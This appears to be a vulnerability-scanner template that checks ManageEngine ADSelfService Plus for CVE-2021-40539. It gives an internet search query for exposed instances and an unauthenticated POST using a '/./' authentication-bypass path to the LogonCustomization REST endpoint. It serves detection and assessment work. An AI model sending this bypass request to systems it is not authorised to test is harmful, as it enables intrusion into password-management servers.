name: ADSelfService Plus RCE CVE-2021-40539
manual: true
query: title="ManageEngine - ADSelfService Plus" || app="ZOHO-ManageEngine-ADSelfService"
  || title="ADSelfService Plus" || body="ADSelfService Plus"
transport: http
rules:
  r0:
    request:
      method: POST
      path: /./RestAPI/LogonCustomization
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: methodToCall=previewMobLogo
    expression: response.status == 200 && response.body.bcontains(b"var d = new Date();")
      && response.body.bcontains(b"window.parent.$(\"#tabLogo\")")
expression: r0()
detail:
  links:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-40539
  - https://forum.butian.net/share/876
  description: ManageEngine ADSelfService Plus is an integrated self-service password
    management and single sign on solution.
  tags: rce,unauth
